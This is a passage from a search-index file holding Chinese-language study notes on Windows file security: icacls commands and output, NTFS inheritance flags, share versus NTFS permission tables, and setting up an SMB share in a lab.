\u6743\u9650\u4ee5\u4fbf\u4e8e\u7ba1\u7406\uff0c\u56e0\u6b64\u7ba1\u7406\u5458\u65e0\u9700\u4e3a\u6bcf\u4e2a\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u663e\u5f0f\u8bbe\u7f6e\u6743\u9650\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u975e\u5e38\u8017\u65f6\u3002\u5982\u679c\u786e\u5b9e\u9700\u8981\u660e\u786e\u8bbe\u7f6e\u6743\u9650\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u7981\u7528\u5fc5\u8981\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u6743\u9650\u7ee7\u627f\uff0c\u7136\u540e\u76f4\u63a5\u5728\u6bcf\u4e2a\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u4e0a\u8bbe\u7f6e\u6743\u9650\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#integrity-control-access-control-list-icacls","title":"Integrity Control Access Control List (icacls)\u5b8c\u6574\u6027\u8bbf\u95ee\u5217\u8868","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u5b89\u5168\u9009\u9879\u5361\u4e0b\u7684\u6587\u4ef6\u8d44\u6e90\u7ba1\u7406\u5668 GUI \u7ba1\u7406 Windows \u4e2d\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684 NTFS \u6743\u9650\u3002\u9664\u4e86 GUI\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5728 Windows \u4e2d\u4f7f\u7528 icacls \u5b9e\u7528\u7a0b\u5e8f\u5728\u547d\u4ee4\u884c\u4e2d\u5b9e\u73b0\u5bf9 NTFS \u6587\u4ef6\u6743\u9650\u7684\u7cbe\u7ec6\u7c92\u5ea6\u3002</p> <p><code>icacls</code>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ece\u5de5\u4f5c\u76ee\u5f55\u4e2d\u8fd0\u884c\u6216<code>icacls C:\\Windows</code>\u9488\u5bf9\u5f53\u524d\u4e0d\u5728\u7684\u76ee\u5f55\u8fd0\u884c\u6765\u5217\u51fa\u7279\u5b9a\u76ee\u5f55\u7684 NTFS \u6743\u9650\u3002</p> <pre><code>C:\\htb&gt; icacls c:\\windows\nc:\\windows NT SERVICE\\TrustedInstaller:(F)\n           NT SERVICE\\TrustedInstaller:(CI)(IO)(F)\n           NT AUTHORITY\\SYSTEM:(M)\n           NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F)\n           BUILTIN\\Administrators:(M)\n           BUILTIN\\Administrators:(OI)(CI)(IO)(F)\n           BUILTIN\\Users:(RX)\n           BUILTIN\\Users:(OI)(CI)(IO)(GR,GE)\n           CREATOR OWNER:(OI)(CI)(IO)(F)\n           APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX)\n           APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)\n           APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(RX)\n           APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>\u8d44\u6e90\u8bbf\u95ee\u7ea7\u522b\u5728\u8f93\u51fa\u4e2d\u7684\u6bcf\u4e2a\u7528\u6237\u4e4b\u540e\u5217\u51fa\u3002\u53ef\u80fd\u7684\u7ee7\u627f\u8bbe\u7f6e\u662f\uff1a</p> <ul> <li><code>(CI)</code>: \u5bb9\u5668\u7ee7\u627f</li> <li><code>(OI)</code>: \u5bf9\u8c61\u7ee7\u627f</li> <li><code>(IO)</code>: \u53ea\u7ee7\u627f</li> <li><code>(NP)</code>\uff1a\u4e0d\u4f20\u64ad\u7ee7\u627f</li> <li><code>(I)</code>: \u4ece\u7236\u5bb9\u5668\u7ee7\u627f\u7684\u6743\u9650 \u5728\u4e0a\u9762\u7684\u793a\u4f8b\u4e2d\uff0c<code>NT AUTHORITY\\SYSTEM</code>\u5e10\u6237\u5177\u6709\u5bf9\u8c61\u7ee7\u627f\u3001\u5bb9\u5668\u7ee7\u627f\u3001\u4ec5\u7ee7\u627f\u548c\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002\u8fd9\u610f\u5473\u7740\u6b64\u5e10\u6237\u53ef\u4ee5\u5b8c\u5168\u63a7\u5236\u6b64\u76ee\u5f55\u548c\u5b50\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u7cfb\u7edf\u5bf9\u8c61\u3002</li> </ul> <p>\u57fa\u672c\u8bbf\u95ee\u6743\u9650\u5982\u4e0b\uff1a</p> <ul> <li><code>F</code>\u200a: \u5b8c\u5168\u8bbf\u95ee</li> <li><code>D</code>\u200a: \u5220\u9664\u8bbf\u95ee</li> <li><code>N</code>\u200a: \u65e0\u6cd5\u8bbf\u95ee</li> <li><code>M</code>\u200a: \u4fee\u6539\u8bbf\u95ee</li> <li><code>RX</code>\u200a: \u8bfb\u53d6\u548c\u6267\u884c\u6743\u9650</li> <li><code>R</code>\u200a: \u53ea\u8bfb\u8bbf\u95ee</li> <li><code>W</code>: \u53ea\u5199\u8bbf\u95ee</li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>icacls</code>\u901a\u8fc7\u547d\u4ee4\u884c\u6dfb\u52a0\u548c\u5220\u9664\u6743\u9650\u3002\u8fd9\u91cc\u6211\u4eec\u5728\u672c\u5730\u7ba1\u7406\u5458\u5e10\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c<code>icacls</code>\uff0c\u8be5\u5e10\u6237\u663e\u793a\u4e86<code>C:\\users</code>\u76ee\u5f55\uff0c\u5176\u4e2d<code>joe</code>\u7528\u6237\u6ca1\u6709\u4efb\u4f55\u5199\u5165\u6743\u9650\u3002</p> <pre><code>C:\\htb&gt; icacls c:\\Users\nc:\\Users NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n         BUILTIN\\Administrators:(OI)(CI)(F)\n         BUILTIN\\Users:(RX)\n         BUILTIN\\Users:(OI)(CI)(IO)(GR,GE)\n         Everyone:(RX)\n         Everyone:(OI)(CI)(IO)(GR,GE)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>\u4f7f\u7528\u547d\u4ee4<code>icacls c:\\users /grant joe:f</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u6388\u4e88joe\u7528\u6237\u5bf9\u76ee\u5f55\u7684\u5b8c\u5168\u63a7\u5236\u6743\uff0c\u4f46\u8003\u8651\u5230\u547d\u4ee4\u4e2d\u672a\u5305\u542b<code>(oi)</code>\u00a0and\u00a0<code>(ci)</code>\uff0cjoe\u7528\u6237\u5c06\u53ea\u5bf9<code>c:\\users</code> \u6587\u4ef6\u5939\u62e5\u6709\u6743\u9650\uff0c\u800c\u5bf9\u5176\u4e2d\u5305\u542b\u7684\u7528\u6237\u5b50\u76ee\u5f55\u548c\u6587\u4ef6\u6ca1\u6709\u6743\u9650\u3002</p> <pre><code>C:\\htb&gt; icacls c:\\users /grant joe:f\nprocessed file: c:\\users\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <pre><code>C:\\htb&gt; &gt;icacls c:\\users\nc:\\users WS01\\joe:(F)\n         NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n         BUILTIN\\Administrators:(OI)(CI)(F)\n         BUILTIN\\Users:(RX)\n         BUILTIN\\Users:(OI)(CI)(IO)(GR,GE)\n         Everyone:(RX)\n         Everyone:(OI)(CI)(IO)(GR,GE)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u64a4\u9500\u8fd9\u4e9b\u6743\u9650<code>icacls c:\\users /remove joe</code>\u3002</p> <p><code>icacls</code>\u975e\u5e38\u5f3a\u5927\uff0c\u53ef\u4ee5\u5728\u57df\u8bbe\u7f6e\u4e2d\u4f7f\u7528\uff0c\u4ee5\u6388\u4e88\u67d0\u4e9b\u7528\u6237\u6216\u7ec4\u5bf9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u7279\u5b9a\u6743\u9650\uff0c\u660e\u786e\u62d2\u7edd\u8bbf\u95ee\uff0c\u542f\u7528\u6216\u7981\u7528\u7ee7\u627f\u6743\u9650\uff0c\u4ee5\u53ca\u66f4\u6539\u76ee\u5f55/\u6587\u4ef6\u6240\u6709\u6743\u3002</p> <p><code>icacls</code>\u53ef\u4ee5\u5728\u6b64\u5904\u627e\u5230\u547d\u4ee4\u884c\u53c2\u6570\u548c\u8be6\u7ec6\u6743\u9650\u8bbe\u7f6e\u7684\u5b8c\u6574\u5217\u8868\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#ntfs","title":"NTFS \u4e0e\u5171\u4eab\u6743\u9650","text":"<p>\u5fae\u8f6f\u62e5\u6709\u8d85\u8fc770%\u7684\u80a1\u6743Windows \u684c\u9762\u64cd\u4f5c\u7cfb\u7edf\u7684\u5168\u7403\u5e02\u573a\u4efd\u989d\u3002\u8fd9\u5c31\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u5927\u591a\u6570\u6076\u610f\u8f6f\u4ef6\u4f5c\u8005\u9009\u62e9\u4e3a Windows \u7f16\u5199\u6076\u610f\u8f6f\u4ef6\uff0c\u4ee5\u53ca\u4e3a\u4ec0\u4e48\u8bb8\u591a\u4eba\u8ba4\u4e3a Windows \u4e0d\u5982\u5176\u4ed6\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u3002\u4ece\u5546\u4e1a\u89d2\u5ea6\u6765\u770b\uff0c\u6076\u610f\u8f6f\u4ef6\u4f5c\u8005\u5c06\u8d44\u6e90\u7528\u4e8e\u4e3a Windows \u7f16\u5199\u6076\u610f\u8f6f\u4ef6\u662f\u6709\u610f\u4e49\u7684\u3002\u8fd9\u662f\u4e00\u4e2a\u9ad8\u4ef7\u503c\u7684\u76ee\u6807\u3002\u4efb\u4f55\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5bf9\u6076\u610f\u8f6f\u4ef6\u514d\u75ab\u7684\u60f3\u6cd5\u662f\u4e00\u4e2a\u6280\u672f\u8c2c\u8bef\u3002\u5982\u679c\u53ef\u4ee5\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7f16\u5199\u8f6f\u4ef6\uff0c\u90a3\u4e48\u53ef\u4ee5\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7f16\u5199\u75c5\u6bd2\u3002\u8bf7\u8bb0\u4f4f\uff0c\u6839\u636e\u5b9a\u4e49\uff0c\u75c5\u6bd2\u662f\u6076\u610f\u7f16\u5199\u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u4e3a\u4efb\u4f55\u64cd\u4f5c\u7cfb\u7edf\u7f16\u5199\u3002\u8bb8\u591a\u4e3a Windows \u7f16\u5199\u7684\u6076\u610f\u8f6f\u4ef6\u53d8\u4f53\u53ef\u4ee5\u901a\u8fc7\u5e94\u7528\u5bbd\u677e\u6743\u9650\u7684\u7f51\u7edc\u5171\u4eab\u5728\u7f51\u7edc\u4e0a\u4f20\u64ad\u3002\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u76f4\u5230\u4eca\u5929\uff0c\u81ed\u540d\u662d\u8457\u7684<code>EternalBlue</code>\u6f0f\u6d1e\u4ecd\u7136\u56f0\u6270\u7740\u672a\u4fee\u8865\u7684\u6b63\u5728\u8fd0\u884c\u7684 Windows \u7cfb\u7edf\uff0c<code>SMBv1</code>\u5e76\u7ecf\u5e38\u4e3a\u52d2\u7d22\u8f6f\u4ef6\u5173\u95ed\u7ec4\u7ec7\u94fa\u5e73\u9053\u8def\u3002</p> <p>(\u00a0<code>Server Message Block protocol</code>)<code>SMB</code>\u5728 Windows \u4e2d\u7528\u4e8e\u8fde\u63a5\u6587\u4ef6\u548c\u6253\u5370\u673a\u7b49\u5171\u4eab\u8d44\u6e90\u3002\u5b83\u7528\u4e8e\u5927\u3001\u4e2d\u3001\u5c0f\u578b\u4f01\u4e1a\u73af\u5883\u3002\u8bf7\u53c2\u9605\u4e0b\u56fe\u4ee5\u53ef\u89c6\u5316\u6b64\u6982\u5ff5\uff1a ![[htb-windowsntfs.png]]</p> <pre><code>\u6ce8\u610f\uff1a\u6bcf\u5f53\u60a8\u770b\u5230\u6982\u5ff5\u7684\u53ef\u89c6\u5316/\u56fe\u8868\u65f6\uff0c\u8bf7\u82b1\u65f6\u95f4\u5f7b\u5e95\u7406\u89e3\u5b83\u3002\u4e00\u5f20\u56fe\u7247\u53ef\u4ee5\u503c\u4e00\u5343\u5b57\uff0c\u4f46\u9605\u8bfb\u65f6\u5f88\u5bb9\u6613\u8df3\u8fc7\u3002\n</code></pre> <p>NTFS \u6743\u9650\u548c\u5171\u4eab\u6743\u9650\u901a\u5e38\u88ab\u7406\u89e3\u4e3a\u76f8\u540c\u3002\u8bf7\u6ce8\u610f\uff0c\u5b83\u4eec\u5e76\u4e0d\u76f8\u540c\uff0c\u4f46\u901a\u5e38\u9002\u7528\u4e8e\u76f8\u540c\u7684\u5171\u4eab\u8d44\u6e90\u3002\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u4fdd\u62a4/\u6388\u4e88\u5bf9\u8c61\u8bbf\u95ee\u6258\u7ba1\u5728\u8fd0\u884c NTFS \u6587\u4ef6\u7cfb\u7edf\u7684 Windows \u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u7f51\u7edc\u5171\u4eab\u7684\u5404\u4e2a\u6743\u9650\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_6","title":"\u5171\u4eab\u6743\u9650","text":"<p>\u5141\u8bb8|\u63cf\u8ff0 |----|----| <code>Full Control</code>|\u5141\u8bb8\u7528\u6237\u6267\u884c\u66f4\u6539\u548c\u8bfb\u53d6\u6743\u9650\u8d4b\u4e88\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u4ee5\u53ca\u66f4\u6539 NTFS \u6587\u4ef6\u548c\u5b50\u6587\u4ef6\u5939\u7684\u6743\u9650 <code>Change</code>|\u5141\u8bb8\u7528\u6237\u8bfb\u53d6\u3001\u7f16\u8f91\u3001\u5220\u9664\u548c\u6dfb\u52a0\u6587\u4ef6\u548c\u5b50\u6587\u4ef6\u5939 <code>Read</code>|\u5141\u8bb8\u7528\u6237\u67e5\u770b\u6587\u4ef6\u548c\u5b50\u6587\u4ef6\u5939\u5185\u5bb9</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#ntfs_1","title":"NTFS \u57fa\u672c\u6743\u9650","text":"<p>\u5141\u8bb8|\u63cf\u8ff0 |---|---| <code>Full Control</code>|\u5141\u8bb8\u7528\u6237\u6dfb\u52a0\u3001\u7f16\u8f91\u3001\u79fb\u52a8\u3001\u5220\u9664\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u4ee5\u53ca\u66f4\u6539\u9002\u7528\u4e8e\u6240\u6709\u5141\u8bb8\u6587\u4ef6\u5939\u7684 NTFS \u6743\u9650 <code>Modify</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u67e5\u770b\u548c\u4fee\u6539\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u6743\u9650\u3002\u8fd9\u5305\u62ec\u6dfb\u52a0\u6216\u5220\u9664\u6587\u4ef6 <code>Read &amp; Execute</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u548c\u6267\u884c\u7a0b\u5e8f\u7684\u6743\u9650 <code>List folder contents</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u67e5\u770b\u6587\u4ef6\u548c\u5b50\u6587\u4ef6\u5939\u5217\u8868\u7684\u6743\u9650 <code>Read</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u6743\u9650 <code>Write</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u5c06\u66f4\u6539\u5199\u5165\u6587\u4ef6\u5e76\u5c06\u65b0\u6587\u4ef6\u6dfb\u52a0\u5230\u6587\u4ef6\u5939 <code>Special Permissions</code>|\u591a\u79cd\u9ad8\u7ea7\u6743\u9650\u9009\u9879</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#ntfs_2","title":"NTFS \u7279\u6b8a\u6743\u9650","text":"<p>\u5141\u8bb8|\u63cf\u8ff0 |---|---| <code>Full control</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u6dfb\u52a0\u3001\u7f16\u8f91\u3001\u79fb\u52a8\u3001\u5220\u9664\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u4ee5\u53ca\u66f4\u6539\u9002\u7528\u4e8e\u6240\u6709\u5141\u8bb8\u6587\u4ef6\u5939\u7684 NTFS \u6743\u9650 <code>Traverse folder / execute file</code>|\u5373\u4f7f\u7528\u6237\u88ab\u62d2\u7edd\u8bbf\u95ee\u7236\u6587\u4ef6\u5939\u7ea7\u522b\u7684\u5185\u5bb9\uff0c\u7528\u6237\u4e5f\u88ab\u5141\u8bb8\u6216\u62d2\u7edd\u8bbf\u95ee\u76ee\u5f55\u7ed3\u6784\u4e2d\u7684\u5b50\u6587\u4ef6\u5939\u3002\u7528\u6237\u4e5f\u53ef\u80fd\u88ab\u5141\u8bb8\u6216\u62d2\u7edd\u6267\u884c\u7a0b\u5e8f\u7684\u6743\u9650 <code>List folder/read data</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u67e5\u770b\u7236\u6587\u4ef6\u5939\u4e2d\u5305\u542b\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u6743\u9650\u3002\u8fd8\u53ef\u4ee5\u5141\u8bb8\u7528\u6237\u6253\u5f00\u548c\u67e5\u770b\u6587\u4ef6 <code>Read attributes</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u67e5\u770b\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u57fa\u672c\u5c5e\u6027\u3002\u57fa\u672c\u5c5e\u6027\u793a\u4f8b\uff1a\u7cfb\u7edf\u3001\u5b58\u6863\u3001\u53ea\u8bfb\u548c\u9690\u85cf <code>Read extended attributes</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u67e5\u770b\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6269\u5c55\u5c5e\u6027\u7684\u6743\u9650\u3002\u5c5e\u6027\u56e0\u7a0b\u5e8f\u800c\u5f02 <code>Create files/write data</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u5728\u6587\u4ef6\u5939\u4e2d\u521b\u5efa\u6587\u4ef6\u548c\u66f4\u6539\u6587\u4ef6\u7684\u6743\u9650 <code>Create folders/append data</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u5728\u6587\u4ef6\u5939\u4e2d\u521b\u5efa\u5b50\u6587\u4ef6\u5939\u7684\u6743\u9650\u3002\u53ef\u4ee5\u5c06\u6570\u636e\u6dfb\u52a0\u5230\u6587\u4ef6\u4e2d\uff0c\u4f46\u4e0d\u80fd\u8986\u76d6\u9884\u5148\u5b58\u5728\u7684\u5185\u5bb9 <code>Write attributes</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u66f4\u6539\u6587\u4ef6\u5c5e\u6027\u3002\u6b64\u6743\u9650\u4e0d\u6388\u4e88\u521b\u5efa\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6743\u9650 <code>Write extended attributes</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u66f4\u6539\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6269\u5c55\u5c5e\u6027\u7684\u6743\u9650\u3002\u5c5e\u6027\u56e0\u7a0b\u5e8f\u800c\u5f02 <code>Delete subfolders and files</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u5220\u9664\u5b50\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u7684\u6743\u9650\u3002\u4e0d\u4f1a\u5220\u9664\u7236\u6587\u4ef6\u5939 <code>Delete</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u5220\u9664\u7236\u6587\u4ef6\u5939\u3001\u5b50\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u7684\u6743\u9650\u3002 <code>Read permissions</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u8bfb\u53d6\u6587\u4ef6\u5939\u7684\u6743\u9650 <code>Change permissions</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u66f4\u6539\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6743\u9650 <code>Take ownership</code>|\u5141\u8bb8\u6216\u62d2\u7edd\u7528\u6237\u83b7\u53d6\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6240\u6709\u6743\u3002\u6587\u4ef6\u7684\u6240\u6709\u8005\u62e5\u6709\u66f4\u6539\u4efb\u4f55\u6743\u9650\u7684\u5b8c\u5168\u6743\u9650</p> <p>\u8bf7\u8bb0\u4f4f\uff0cNTFS \u6743\u9650\u9002\u7528\u4e8e\u6258\u7ba1\u6587\u4ef6\u5939\u548c\u6587\u4ef6\u7684\u7cfb\u7edf\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5728 NTFS \u4e2d\u521b\u5efa\u7684\u6587\u4ef6\u5939\u4ece\u7236\u6587\u4ef6\u5939\u7ee7\u627f\u6743\u9650\u3002\u53ef\u4ee5\u7981\u7528\u7ee7\u627f\u4ee5\u5728\u7236\u6587\u4ef6\u5939\u548c\u5b50\u6587\u4ef6\u5939\u4e0a\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u6743\u9650\uff0c\u6211\u4eec\u5c06\u5728\u672c\u6a21\u5757\u540e\u9762\u6267\u884c\u6b64\u64cd\u4f5c\u3002\u5f53\u901a\u8fc7 SMB\uff08\u901a\u5e38\u4ece\u7f51\u7edc\u4e0a\u7684\u4e0d\u540c\u7cfb\u7edf\uff09\u8bbf\u95ee\u6587\u4ef6\u5939\u65f6\uff0c\u5c06\u5e94\u7528\u5171\u4eab\u6743\u9650\u3002\u8fd9\u610f\u5473\u7740\u5728\u672c\u5730\u6216\u901a\u8fc7 RDP \u767b\u5f55\u5230\u8ba1\u7b97\u673a\u7684\u4eba\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u5730\u5bfc\u822a\u5230\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u4f4d\u7f6e\u6765\u8bbf\u95ee\u5171\u4eab\u6587\u4ef6\u5939\u548c\u6587\u4ef6\uff0c\u5e76\u4e14\u53ea\u9700\u8981\u8003\u8651 NTFS \u6743\u9650\u3002NTFS \u7ea7\u522b\u7684\u6743\u9650\u4f7f\u7ba1\u7406\u5458\u53ef\u4ee5\u66f4\u7cbe\u7ec6\u5730\u63a7\u5236\u7528\u6237\u5728\u6587\u4ef6\u5939\u6216\u6587\u4ef6\u4e2d\u53ef\u4ee5\u6267\u884c\u7684\u64cd\u4f5c\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#creating-a-network-share","title":"Creating a Network Share","text":"<p>\u4e3a\u4e86\u4ece\u6839\u672c\u4e0a\u4e86\u89e3SMB\u53ca\u5176\u4e0eNTFS\u7684\u5173\u7cfb\uff0c\u6211\u4eec\u5c06\u5728<code>Windows 10 \u76ee\u6807 box</code>\u4e0a\u521b\u5efa\u4e00\u4e2a\u7f51\u7edc\u5171\u4eab\u3002</p> <pre><code>\u6ce8\u610f\uff1a\u5728\u5355\u72ec\u7684\u663e\u793a\u5668\u4e0a\u5168\u5c4f\u6253\u5f00 Pwnbox \u662f\u4e00\u79cd\u7406\u60f3\u7684\u5b66\u4e60\u4f53\u9a8c\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u80fd\u81f3\u5c11\u6709\u4e00\u4e2a\u663e\u793a\u5668\u4e13\u95e8\u7528\u4e8e\u663e\u793a\u4e66\u9762\u5185\u5bb9\uff0c\u4e00\u4e2a\u663e\u793a\u5668\u7528\u4e8e\u6211\u4eec\u6b63\u5728\u4e0e\u4e4b\u4ea4\u4e92\u7684\u76d2\u5b50\u3002\u6216\u8005\uff0c\u5982\u679c\u6211\u4eec\u53ea\u80fd\u8bbf\u95ee\u4e00\u4e2a\u663e\u793a\u5668\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u663e\u793a\u5668\u4e0e\u76d2\u5b50\u548c\u667a\u80fd\u624b\u673a\u6216\u5e73\u677f\u7535\u8111\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ee5\u5f15\u7528\u4e66\u9762\u5185\u5bb9\u3002\n</code></pre> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5c06\u901a\u8fc7\u9996\u5148\u5728 Windows 10 \u684c\u9762\u4e0a\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\u5939\u6765\u521b\u5efa\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u5939\u3002\u8bf7\u8bb0\u4f4f\uff0c\u5728\u5927\u591a\u6570\u5927\u578b\u4f01\u4e1a\u73af\u5883\u4e2d\uff0c\u5171\u4eab\u662f\u5728\u5b58\u50a8\u533a\u57df\u7f51\u7edc (SAN)\u3001\u7f51\u7edc\u9644\u52a0\u5b58\u50a8\u8bbe\u5907 (NAS) \u6216\u901a\u8fc7\u670d\u52a1\u5668\u64cd\u4f5c\u7cfb\u7edf\uff08\u5982 Windows Server\uff09\u8bbf\u95ee\u7684\u9a71\u52a8\u5668\u4e0a\u7684\u5355\u72ec\u5206\u533a\u4e0a\u521b\u5efa\u7684\u3002\u5982\u679c\u6211\u4eec\u5728\u684c\u9762\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u9047\u5230\u5171\u4eab\uff0c\u5b83\u8981\u4e48\u662f\u5c0f\u578b\u4f01\u4e1a\uff0c\u8981\u4e48\u53ef\u80fd\u662f\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u6216\u6076\u610f\u653b\u51fb\u8005\u7528\u6765\u6536\u96c6\u548c\u6cc4\u9732\u6570\u636e\u7684\u6ee9\u5934\u9635\u5730\u7cfb\u7edf\u3002</p> <p>\u6211\u4eec\u5c06\u4f7f\u7528 Windows \u4e2d\u7684 GUI \u5b8c\u6210\u6b64\u8fc7\u7a0b\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_7","title":"\u521b\u5efa\u6587\u4ef6\u5939","text":"<p>\u6211\u4eec\u5c06\u4f7f\u7528\u8be5<code>Advanced Sharing</code>\u00a0\u9009\u9879\u6765\u914d\u7f6e\u6211\u4eec\u7684\u5171\u4eab\u3002</p>"},{"location":"Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A0%B8%E5%BF%83/#_8","title":"\u5c06\u6587\u4ef6\u5939\u8bbe\u4e3a\u5171\u4eab","text":"<p>\u8bf7\u6ce8\u610f\u5171\u4eab\u540d\u79f0\u5982\u4f55\u81ea\u52a8\u9ed8\u8ba4\u4e3a\u6587\u4ef6\u5939\u540d\u79f0\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u53ef\u4ee5\u9650\u5236\u53ef\u4ee5\u540c\u65f6\u8fde\u63a5\u5230\u6b64\u5171\u4eab\u7684\u7528\u6237\u6570\u91cf\u3002\u5728\u5b9e\u9645\u73af\u5883\u4e2d\uff0c\u7ba1\u7406\u5458\u6700\u597d\u6839\u636e\u7ecf\u5e38\u9700\u8981\u8bbf\u95ee\u5171\u4eab\u8d44\u6e90\u7684\u7528\u6237\u6570\u91cf\u6765\u8bbe\u7f6e\u6b64\u6570\u5b57\u3002</p> <p>\u4e0e NTFS \u6743\u9650\u7c7b\u4f3c\uff0c\u5171\u4eab\u8d44\u6e90\u6709\u4e00\u4e2a<code>access control list</code>(\u00a0<code>ACL</code>)\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a SMB \u6743\u9650\u5217\u8868\u3002\u8bf7\u8bb0\u4f4f\uff0c\u5bf9\u4e8e\u5171\u4eab\u8d44\u6e90\uff0cSMB \u548c NTFS \u6743\u9650\u5217\u8868\u90fd\u9002\u7528\u4e8e\u5728 Windows \u4e2d\u5171\u4eab\u7684\u6bcf\u4e2a\u8d44\u6e90\u3002ACL \u5305\u542b<code>access control entries</code>(\u00a0<code>ACEs</code>)\u3002\u901a\u5e38\uff0c\u8fd9\u4e9b ACE 